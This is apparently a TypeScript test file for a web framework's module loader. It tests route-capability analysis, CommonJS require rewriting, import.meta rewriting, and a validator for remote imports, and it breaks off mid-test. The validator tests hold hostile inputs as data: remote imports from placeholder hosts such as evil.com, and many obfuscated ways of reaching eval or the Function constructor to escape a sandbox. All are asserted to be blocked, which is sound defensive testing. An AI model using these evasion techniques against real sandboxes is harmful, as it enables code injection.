import "#veryfront/schemas/_test-setup.ts";
import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
import { describe, it } from "#veryfront/testing/bdd.ts";
import { dirname, fromFileUrl } from "#veryfront/compat/path";
import {
  collectLocalWorkerSpecifiers,
  extractModuleSpecifiers,
  scanModuleSpecifiers,
  validateHTTPImports,
} from "./http-validator.ts";
import {
  __setSourceCapabilityParserLoaderForTests,
  resolveStaticRouteMethods,
  resolveStaticRouteOptionsCapability,
  rewriteImportMetaLocations,
  rewriteUnboundCommonJsDynamicRequire,
  usesUnboundCommonJsModule,
} from "./source-capability-analyzer.ts";

describe("resolveStaticRouteOptionsCapability", () => {
  it("proves absence only for statically closed export sets", async () => {
    assertEquals(
      await resolveStaticRouteOptionsCapability(
        "export function GET() {}\nexport type OPTIONS = { enabled: true };",
      ),
      "absent",
    );
  });

  it("keeps every statically visible OPTIONS or default route behind auth", async () => {
    const sources = [
      "export function OPTIONS() {}",
      "export default function route() {}",
      "const handler = () => {}; export { handler as OPTIONS };",
      'export { handler as OPTIONS } from "./handler.ts";',
      "export const OPTIONS = () => new Response();",
    ];

    for (
      const source of [
        "export default 123;",
        "export default { OPTIONS() {} };",
      ]
    ) {
      assertEquals(await resolveStaticRouteOptionsCapability(source), "absent", source);
    }

    for (
      const source of [
        "export const { OPTIONS } = handlers;",
        "export default handler;",
      ]
    ) {
      assertEquals(await resolveStaticRouteOptionsCapability(source), "unknown", source);
    }

    for (const source of sources) {
      assertEquals(await resolveStaticRouteOptionsCapability(source), "present", source);
    }
  });

  it("keeps ambiguous, CommonJS, and invalid sources on the authenticated fallback", async () => {
    const sources = [
      'export * from "./handler.ts";',
      "module.exports = { OPTIONS() {} };",
      "export const OPTIONS = handler;",
      "export const { OPTIONS } = handlers;",
      "export function OPTIONS(",
    ];

    for (const source of sources) {
      assertEquals(await resolveStaticRouteOptionsCapability(source), "unknown", source);
    }
  });
});

describe("resolveStaticRouteMethods", () => {
  it("returns the proven method surface without evaluating the route", async () => {
    assertEquals(
      await resolveStaticRouteMethods(
        "export function GET() {}\nexport function POST() {}",
      ),
      ["GET", "HEAD", "POST"],
    );
  });

  it("keeps dynamic method exports on the conservative fallback", async () => {
    assertEquals(
      await resolveStaticRouteMethods("export const GET = handler;"),
      undefined,
    );
    assertEquals(
      await resolveStaticRouteMethods("export { GET } from './handler.ts';"),
      undefined,
    );
  });
});

describe("usesUnboundCommonJsModule", () => {
  it("distinguishes runtime CommonJS module references from inert text and bindings", async () => {
    assertEquals(await usesUnboundCommonJsModule("module.exports = module.filename;"), true);
    assertEquals(await usesUnboundCommonJsModule('const text = "module.filename";'), false);
    assertEquals(
      await usesUnboundCommonJsModule(
        "function read(module: { path: string }) { return module.path; }",
      ),
      false,
    );
  });
});

describe("rewriteUnboundCommonJsDynamicRequire", () => {
  it("rewrites only runtime dynamic loads from the unbound CommonJS require", async () => {
    const source = [
      'const staticValue = require("./static.cjs");',
      'const moduleName = "./dynamic.cjs";',
      "const dynamicValue = require(moduleName);",
      'let stableMutableName = "./stable-mutable.cjs";',
      "const stableMutableValue = require(stableMutableName);",
      'let mutableName = "./first.cjs";',
      'mutableName = "./second.cjs";',
      "const mutableValue = require(mutableName);",
      "const forwardValue = require(forwardName);",
      'const forwardName = "./forward.cjs";',
      "const resolved = require.resolve(moduleName);",
      "const load = require;",
      "const { resolve } = require;",
      "const preservedKey = { require };",
      'const text = "require(moduleName)";',
      "// require(moduleName)",
      "function local(require: (name: string) => string) {",
      "  return require(moduleName);",
      "}",
    ].join("\n");

    assertEquals(
      await rewriteUnboundCommonJsDynamicRequire(source, "__moduleRequire"),
      [
        'const staticValue = require("./static.cjs");',
        'const moduleName = "./dynamic.cjs";',
        'const dynamicValue = require("./dynamic.cjs");',
        'let stableMutableName = "./stable-mutable.cjs";',
        "const stableMutableValue = __moduleRequire(stableMutableName);",
        'let mutableName = "./first.cjs";',
        'mutableName = "./second.cjs";',
        "const mutableValue = __moduleRequire(mutableName);",
        "const forwardValue = __moduleRequire(forwardName);",
        'const forwardName = "./forward.cjs";',
        "const resolved = __moduleRequire.resolve(moduleName);",
        "const load = __moduleRequire;",
        "const { resolve } = __moduleRequire;",
        "const preservedKey = { require: __moduleRequire };",
        'const text = "require(moduleName)";',
        "// require(moduleName)",
        "function local(require: (name: string) => string) {",
        "  return require(moduleName);",
        "}",
      ].join("\n"),
    );
  });

  it("preserves CommonJS require value references shadowed by local bindings", async () => {
    const source = [
      'const moduleName = "./dynamic.cjs";',
      "function local(require: { resolve(name: string): string }) {",
      "  const load = require;",
      "  const resolve = require.resolve;",
      "  const bag = { require };",
      "  return [load(moduleName), resolve(moduleName)];",
      "}",
    ].join("\n");

    assertEquals(
      await rewriteUnboundCommonJsDynamicRequire(source, "__moduleRequire"),
      source,
    );
  });

  it("wraps static require calls lazily when dynamic require uses the project helper", async () => {
    const source = [
      'const direct = require("./direct.cjs");',
      'const moduleName = "./folded.cjs";',
      "const folded = require(moduleName);",
      'const repeated = require("./direct.cjs");',
      "const dynamic = require(globalThis.dynamicName);",
    ].join("\n");

    assertEquals(
      await rewriteUnboundCommonJsDynamicRequire(
        source,
        "__moduleRequire",
        "__recordRequire",
      ),
      [
        '__recordRequire("./direct.cjs", () => require("./direct.cjs"));',
        '__recordRequire("./folded.cjs", () => require("./folded.cjs"));',
        'const direct = __moduleRequire("./direct.cjs");',
        'const moduleName = "./folded.cjs";',
        'const folded = __moduleRequire("./folded.cjs");',
        'const repeated = __moduleRequire("./direct.cjs");',
        "const dynamic = __moduleRequire(globalThis.dynamicName);",
      ].join("\n"),
    );
  });

  it("rewrites unbound module.require calls without changing local module bindings", async () => {
    const source = [
      'const moduleName = "./folded.cjs";',
      'const direct = module.require("./direct.cjs");',
      "const folded = module['require'](moduleName);",
      "const dynamic = module.require(globalThis.dynamicName);",
      "const load = module.require;",
      "const detached = load(moduleName);",
      "function local(module: { require(name: string): string }) {",
      "  return module.require(moduleName);",
      "}",
    ].join("\n");

    assertEquals(
      await rewriteUnboundCommonJsDynamicRequire(
        source,
        "__moduleRequire",
        "__recordRequire",
      ),
      [
        '__recordRequire("./direct.cjs", () => require("./direct.cjs"));',
        '__recordRequire("./folded.cjs", () => require("./folded.cjs"));',
        'const moduleName = "./folded.cjs";',
        'const direct = __moduleRequire("./direct.cjs");',
        'const folded = __moduleRequire("./folded.cjs");',
        "const dynamic = __moduleRequire(globalThis.dynamicName);",
        "const load = __moduleRequire;",
        "const detached = load(moduleName);",
        "function local(module: { require(name: string): string }) {",
        "  return module.require(moduleName);",
        "}",
      ].join("\n"),
    );
  });

  it("rejects a replacement that is not an identifier", async () => {
    await assertRejects(
      () => rewriteUnboundCommonJsDynamicRequire("require(name);", "not an id"),
      TypeError,
      "identifier",
    );
    await assertRejects(
      () => rewriteUnboundCommonJsDynamicRequire("require(name);", "__moduleRequire", "not an id"),
      TypeError,
      "identifier",
    );
  });

  it("fails closed when the source does not parse", async () => {
    assertEquals(
      await rewriteUnboundCommonJsDynamicRequire("require(", "__moduleRequire"),
      null,
    );
  });
});

describe("rewriteImportMetaLocations", () => {
  it("rewrites syntax nodes without changing inert text", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source = [
      `const direct = import.meta.url;`,
      `const computed = import.meta["url"];`,
      `const text = "import.meta.url";`,
      `// import.meta.url`,
    ].join("\n");

    assertEquals(
      await rewriteImportMetaLocations(source, moduleUrl),
      [
        `const direct = ${JSON.stringify(moduleUrl)};`,
        `const computed = ${JSON.stringify(moduleUrl)};`,
        `const text = "import.meta.url";`,
        `// import.meta.url`,
      ].join("\n"),
    );
    assertEquals(
      await rewriteImportMetaLocations(`const url = import /* comment */ . meta.url;`, moduleUrl),
      `const url = ${JSON.stringify(moduleUrl)};`,
      "comments between import.meta tokens must not bypass the module URL rewrite",
    );
    assertEquals(
      await rewriteImportMetaLocations(`const text = "import metadata";`, moduleUrl),
      `const text = "import metadata";`,
      "the conservative prefilter must leave parser-confirmed inert text unchanged",
    );
  });

  it("preserves import.meta dirname and filename for the declaring module", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const modulePath = fromFileUrl(moduleUrl);
    const source = [
      `const directory = import.meta.dirname;`,
      `const filename = import.meta["filename"];`,
      `const text = "import.meta.dirname import.meta.filename";`,
    ].join("\n");

    assertEquals(
      await rewriteImportMetaLocations(source, moduleUrl),
      [
        `const directory = ${JSON.stringify(dirname(modulePath))};`,
        `const filename = ${JSON.stringify(modulePath)};`,
        `const text = "import.meta.dirname import.meta.filename";`,
      ].join("\n"),
      "bundling must preserve source filesystem locations without changing inert text",
    );
  });

  it("resolves import.meta.resolve against the declaring module", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source = [
      `const direct = import.meta.resolve("./asset.txt");`,
      `const computed = import.meta["resolve"]("../shared.ts");`,
      `const text = "import.meta.resolve('./inert.ts')";`,
      `// import.meta.resolve("./comment.ts")`,
    ].join("\n");

    assertEquals(
      await rewriteImportMetaLocations(source, moduleUrl),
      [
        `const direct = "file:///project/lib/asset.txt";`,
        `const computed = "file:///project/shared.ts";`,
        `const text = "import.meta.resolve('./inert.ts')";`,
        `// import.meta.resolve("./comment.ts")`,
      ].join("\n"),
      "bundling must not move import.meta.resolve to the emitted bundle",
    );
    assertEquals(
      await rewriteImportMetaLocations(`const resolve = import.meta.resolve;`, moduleUrl),
      null,
      "a detached resolver cannot be preserved without binding the original module location",
    );
    assertEquals(
      await rewriteImportMetaLocations(
        `const path = "./asset.txt"; import.meta.resolve(path);`,
        moduleUrl,
      ),
      null,
      "a dynamic specifier must fail closed instead of resolving from the emitted bundle",
    );
    for (const specifier of ["#missing", "?missing"]) {
      assertEquals(
        await rewriteImportMetaLocations(
          `const resolved = import.meta.resolve(${JSON.stringify(specifier)});`,
          moduleUrl,
        ),
        null,
        `${specifier} is not a dependency unless an import map resolves it`,
      );
    }
  });

  it("can preserve import.meta.resolve call timing with a custom expression", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";

    assertEquals(
      await rewriteImportMetaLocations(
        'const resolved = import.meta.resolve("optional-package");',
        moduleUrl,
        undefined,
        (specifier, declaringUrl) =>
          `resolveLater(${JSON.stringify(specifier)}, ${JSON.stringify(declaringUrl)})`,
      ),
      `const resolved = resolveLater("optional-package", ${JSON.stringify(moduleUrl)});`,
    );
    assertEquals(
      await rewriteImportMetaLocations(
        "let failure; try { import.meta.resolve(); } catch (error) { failure = error; }",
        moduleUrl,
        undefined,
        (specifier, declaringUrl) =>
          `resolveLater(${JSON.stringify(specifier)}, ${JSON.stringify(declaringUrl)})`,
      ),
      `let failure; try { resolveLater("undefined", ${JSON.stringify(moduleUrl)}); } ` +
        "catch (error) { failure = error; }",
      "missing resolve arguments must stay as deferred call-site failures",
    );
  });

  it("can preserve computed import.meta.resolve calls with a bound resolver", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source =
      'const specifier = "./asset.txt"; const resolved = import.meta.resolve(specifier);';

    assertEquals(
      await rewriteImportMetaLocations(
        source,
        moduleUrl,
        undefined,
        undefined,
        (argument, declaringUrl) => `resolveLater(${argument}, ${JSON.stringify(declaringUrl)})`,
      ),
      `const specifier = "./asset.txt"; const resolved = resolveLater(specifier, ${
        JSON.stringify(moduleUrl)
      });`,
    );
  });

  it("can preserve detached import.meta.resolve references with a bound resolver", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source = "const resolve = import.meta.resolve; const result = resolve('./asset.txt');";

    assertEquals(
      await rewriteImportMetaLocations(
        source,
        moduleUrl,
        undefined,
        undefined,
        undefined,
        (declaringUrl) => `resolveFrom(${JSON.stringify(declaringUrl)})`,
      ),
      `const resolve = resolveFrom(${JSON.stringify(moduleUrl)}); ` +
        "const result = resolve('./asset.txt');",
    );
  });

  it("binds whole import.meta references to the declaring module", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source = "const meta = import.meta; const { url, resolve } = meta;";

    assertEquals(
      await rewriteImportMetaLocations(
        source,
        moduleUrl,
        undefined,
        undefined,
        undefined,
        () => "resolveLater",
      ),
      'const meta = ({ __proto__: null, url: "file:///project/lib/helper.ts", dirname: "/project/lib", ' +
        'filename: "/project/lib/helper.ts", resolve: resolveLater }); ' +
        "const { url, resolve } = meta;",
    );
  });

  it("rebinds nested import.meta locations in computed resolve arguments", async () => {
    const moduleUrl = "file:///project/lib/helper.ts";
    const source =
      'const resolved = import.meta.resolve(new URL("./asset.txt", import.meta.url).href);';

    assertEquals(
      await rewriteImportMetaLocations(
        source,
        moduleUrl,
        undefined,
        undefined,
        (argument, declaringUrl) => `resolveLater(${argument}, ${JSON.stringify(declaringUrl)})`,
      ),
      `const resolved = resolveLater(new URL("./asset.txt", ${JSON.stringify(moduleUrl)}).href, ${
        JSON.stringify(moduleUrl)
      });`,
      "the nested module URL must not resolve from a temporary emitted module",
    );
  });
});

describe("routing/api/module-loader/http-validator", () => {
  describe("validateHTTPImports", () => {
    it("should block all remote imports when allowedHosts is empty", async () => {
      await assertRejects(
        async () => await validateHTTPImports('import foo from "https://evil.com/lib.js";', []),
        Error,
        "Remote import blocked",
      );
    });

    it("should block bare side-effect remote imports when allowedHosts is empty", async () => {
      await assertRejects(
        async () => await validateHTTPImports('import "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a side-effect-only remote import must still be blocked by the allow-list",
      );
    });

    it("should reject an http:// URL for an https-only allowed host", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import x from "http://esm.sh/react";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
        "an http:// URL must not satisfy an https-only allowed host",
      );
    });

    it("should reject an off-port URL for an allowed host", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import x from "https://esm.sh:8443/react";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
        "a non-default port must not satisfy an allowed host pinned to the default port",
      );
    });

    it("should block remote re-exports that are not allow-listed", async () => {
      await assertRejects(
        async () => await validateHTTPImports('export { pwn } from "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a named re-export is a remote import and must be blocked",
      );
      await assertRejects(
        async () => await validateHTTPImports('export * from "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a star re-export is a remote import and must be blocked",
      );
    });

    it("should allow remote re-exports from allowed hosts", async () => {
      await validateHTTPImports('export { a } from "https://esm.sh/x.js";', [
        "https://esm.sh",
      ]);
      await validateHTTPImports('export * from "https://esm.sh/x.js";', ["https://esm.sh"]);
    });

    it("should ignore remote re-export text inside strings and comments", async () => {
      await validateHTTPImports(
        [
          `const example = 'export * from "https://evil.com/x.js";';`,
          `// export { pwn } from "https://evil.com/y.js";`,
          `export { ok } from "https://esm.sh/ok.js";`,
        ].join("\n"),
        ["https://esm.sh"],
      );
    });

    it("should allow imports from allowed hosts", async () => {
      await validateHTTPImports('import React from "https://esm.sh/react@18";', [
        "https://esm.sh",
      ]);
    });

    it("should reject imports from non-allowed hosts", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import malware from "https://evil.com/bad.js";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject prefix-domain bypasses of allowed hosts", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import malware from "https://esm.sh.evil.example/bad.js";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should check dynamic imports", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('const mod = import("https://evil.com/mod.js");', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject unconstrained dynamic imports", async () => {
      await assertRejects(
        async () => await validateHTTPImports(`const load = (url: string) => import(url);`, []),
        Error,
        "unconstrained dynamic import",
      );
    });

    it("should reject inline module URLs", async () => {
      for (const specifier of ["data:text/javascript,export default 1", "blob:null/id"]) {
        await assertRejects(
          async () => await validateHTTPImports(`import ${JSON.stringify(specifier)};`, []),
          Error,
          "inline module URLs",
        );
      }
    });

    it("should check multiline static imports", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            [
              `import {`,
              `  value,`,
              `} from "https://evil.com/mod.js";`,
            ].join("\n"),
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should decode escaped remote import specifiers before validation", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            String.raw`import "https:\x2f\x2fevil.com/mod.js";`,
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject uppercase remote schemes through the same allow-list", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports('import "HTTPS://evil.com/mod.js";', ["https://esm.sh"]),
        Error,
        "Remote import blocked",
      );
    });

    it("should not leak RangeError for an out-of-range Unicode escape", async () => {
      const scan = scanModuleSpecifiers(String.raw`import "\u{110000}";`);

      assertEquals(scan.specifiers, []);
    });

    it("should check dynamic imports inside template interpolations", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            [
              "const rendered = `prefix ${",
              `  await import("https://evil.com/mod.js")`,
              "} suffix`;",
            ].join("\n"),
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject dynamic code generation before module evaluation", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(`const load = eval('import("https://evil.com/mod.js")');`, []),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = new Function('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
    });

    it("should reject TypeScript import-equals aliases of global code generators", async () => {
      for (
        const source of [
          `import Make = globalThis.Function; Make("return 1")();`,
          `import run = globalThis.eval; run("1");`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a TypeScript import-equals value alias must retain generator capabilities",
        );
      }
    });

    it("should reject computed dynamic code generation before module evaluation", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["ev" + "al"]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["Fun" + "ction"]('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["eva" + "l"]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = (() => {}).constructor('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Constructor = (() => {}).constructor; const load = Constructor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { constructor: Constructor } = (() => {}); const load = Constructor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
    });

    it("should recognize the Node global alias without ignoring local shadowing", async () => {
      for (
        const source of [
          `global.eval('import("https://evil.com/mod.js")');`,
          `global.Function('return import("https://evil.com/mod.js")')();`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "Node global aliases must retain the global evaluator capability",
        );
      }
      await validateHTTPImports(
        `const global = { Function: () => "local", eval: () => "local" };` +
          ` export const GET = () => new Response(global.Function() + global.eval());`,
        [],
      );
    });

    it("should reject reflective retrieval of a dynamic code generator", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = Reflect.get(globalThis, "ev" + "al"); run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a generator name rejoined from concatenated literals must still be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const make = Reflect.get(globalThis, "Fun" + "ction"); make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a reflectively retrieved Function constructor must still be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Ctor = Reflect.get(() => {}, "const" + "ructor"); Ctor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a reflectively retrieved constructor must still be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const descriptor = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(() => {}), "constructor");` +
              ` const make = descriptor.value;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a descriptor read from Function.prototype exposes the Function constructor",
      );
    });

    it("should reject Function exposed through a constructor property descriptor", async () => {
      for (const descriptorOwner of ["Object", "Reflect"]) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const descriptor = ${descriptorOwner}.getOwnPropertyDescriptor(` +
                `Object.getPrototypeOf(() => {}), "constructor");` +
                ` const Make = descriptor.value;` +
                ` Make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${descriptorOwner}.getOwnPropertyDescriptor can expose the Function constructor`,
        );
      }
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const descriptors = Object.getOwnPropertyDescriptors(` +
              `Object.getPrototypeOf(() => {}));` +
              ` const make = Object.values(descriptors).find((entry) =>` +
              ` entry.value === Function)?.value;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "plural descriptor reads can recover the Function constructor",
      );
      for (
        const source of [
          `globalThis.Symbol = () => "constructor"; const fn = () => {};` +
          ` fn[Symbol()]('return import("https://blocked.example/mod.js")')();`,
          `const host = globalThis; host.Symbol = { iterator: "constructor" };` +
          ` const fn = () => {};` +
          ` fn[Symbol.iterator]('return import("https://blocked.example/mod.js")')();`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(source, []),
          Error,
          "dynamic code generation",
          "a route must not replace the global Symbol intrinsic before a computed read",
        );
      }
    });

    it("should reject guarded descriptor reads through local aliases", async () => {
      for (
        const invocation of [
          `get(Object.getPrototypeOf(() => {}), "constructor")`,
          `get?.(Object.getPrototypeOf(() => {}), "constructor")`,
          `get.call(Object, Object.getPrototypeOf(() => {}), "constructor")`,
          `get.apply(Object, [Object.getPrototypeOf(() => {}), "constructor"])`,
          `get.bind(Object)(Object.getPrototypeOf(() => {}), "constructor")`,
          `get.bind?.(Object)(Object.getPrototypeOf(() => {}), "constructor")`,
          `Reflect.apply(get, Object, [Object.getPrototypeOf(() => {}), "constructor"])`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const get = Object.getOwnPropertyDescriptor;` +
                ` const make = ${invocation}.value;` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${invocation} must retain descriptor capability checks`,
        );
      }
      for (
        const bindingSource of [
          `const get = Object.getOwnPropertyDescriptor.bind(Object);`,
          `const raw = Object.getOwnPropertyDescriptor; const get = raw.bind(Object);`,
          `const get = Reflect.getOwnPropertyDescriptor.bind(Reflect);`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${bindingSource}` +
                ` const make = get(Object.getPrototypeOf(() => {}), "constructor").value;` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${bindingSource} must retain descriptor capability checks`,
        );
      }
      for (
        const bindingSource of [
          `const [get] = [Object.getOwnPropertyDescriptor];`,
          `let get; [get] = [Object.getOwnPropertyDescriptor];`,
          `const [[get]] = [[Object.getOwnPropertyDescriptor]];`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${bindingSource}` +
                ` const make = get(Object.getPrototypeOf(() => {}), "constructor").value;` +
                ` make('return import("https://blocked.example/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          `${bindingSource} must retain array destructuring provenance`,
        );
      }
      await validateHTTPImports(
        `const [safe] = [() => "ok", Object.getOwnPropertyDescriptor];` +
          ` export const value = safe();`,
        [],
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { getOwnPropertyDescriptor: get } = Reflect;` +
              ` const make = get(Object.getPrototypeOf(() => {}), "constructor").value;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "destructuring Reflect.getOwnPropertyDescriptor must retain the guarded intrinsic",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let get; ({ getOwnPropertyDescriptor: get } = Object);` +
              ` const make = get(Object.getPrototypeOf(() => {}), "constructor").value;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an assigned Object.getOwnPropertyDescriptor alias must retain the guarded intrinsic",
      );
      for (
        const descriptorAlias of [
          `export const get = Object.getOwnPropertyDescriptor;`,
          `const get = Reflect.getOwnPropertyDescriptor; export { get };`,
          `export default Object.getOwnPropertyDescriptor;`,
          `const get = Reflect.getOwnPropertyDescriptor; export default get;`,
          `const readers = {}; readers.get = Object.getOwnPropertyDescriptor;` +
          ` export const get = readers.get;`,
          `const source = { read: Object.getOwnPropertyDescriptor };` +
          ` const readers = { ...source }; export const get = readers.read;`,
          `const readers = Object.assign({},` +
          ` { read: Reflect.getOwnPropertyDescriptor }); export const get = readers.read;`,
          `const readers = {}; Object.assign(readers,` +
          ` { read: Object.getOwnPropertyDescriptor }); export const get = readers.read;`,
          `const readers = {}; Object.defineProperty(readers, "read",` +
          ` { value: Reflect.getOwnPropertyDescriptor }); export const get = readers.read;`,
          `const readers = {}; Object.assign.apply(Object,` +
          ` [readers, { read: Object.getOwnPropertyDescriptor }]);` +
          ` export const get = readers.read;`,
          `const readers = {}; Reflect.apply(Object.defineProperty, Object,` +
          ` [readers, "read", { value: Reflect.getOwnPropertyDescriptor }]);` +
          ` export const get = readers.read;`,
          `const copy = Object.assign.bind(Object); const readers = {};` +
          ` copy(readers, { read: Object.getOwnPropertyDescriptor });` +
          ` export const get = readers.read;`,
        ]
      ) {
        await assertRejects(
          async () => await validateHTTPImports(descriptorAlias, []),
          Error,
          "dynamic code generation",
          "an exported descriptor-reader alias must not cross a module boundary",
        );
      }
    });

    it("should reject a generator name hidden in a single escaped string literal", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = Reflect.get(globalThis, "\\x65val"); run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const make = Reflect.get(globalThis, "\\x46unction"); make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to Function and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = globalThis["\\u{65}val"]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a code-point escape inside one literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Ctor = Reflect.get(() => {}, "\\x63onstructor"); Ctor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to constructor and must be rejected",
      );
    });

    it("should reject a generator name hidden in a template literal", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const run = Reflect.get(globalThis, `\\x65val`); run(payload);",
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside a template literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const make = globalThis[`\\x46unction`]; make(payload)();",
            [],
          ),
        Error,
        "dynamic code generation",
        "a template literal computes a global property just as a quoted one does",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const run = Reflect.get(globalThis, `ev` + `al`); run(payload);",
            [],
          ),
        Error,
        "dynamic code generation",
        "a generator name rejoined from concatenated templates must still be rejected",
      );
    });

    it("should reject a global property read under a name it cannot resolve", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = ["e", "v", "a", "l"].join(""); const run = globalThis[name];` +
              ` run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a runtime-computed global property may resolve to eval and must not pass as inert",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = atob("ZXZhbA=="); const run = globalThis?.[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an optional-chained global read hides the same lookup and must be rejected too",
      );
    });

    it("should reject a computed global read through an alias of the global object", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = g[name]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "aliasing globalThis must not hide a runtime-computed generator lookup",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis; const h = g; const run = h[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of an alias of the global object hides the same lookup",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis as typeof globalThis;` +
              ` const run = g[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a TypeScript assertion around a global alias must not hide computed reads",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = self[name]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
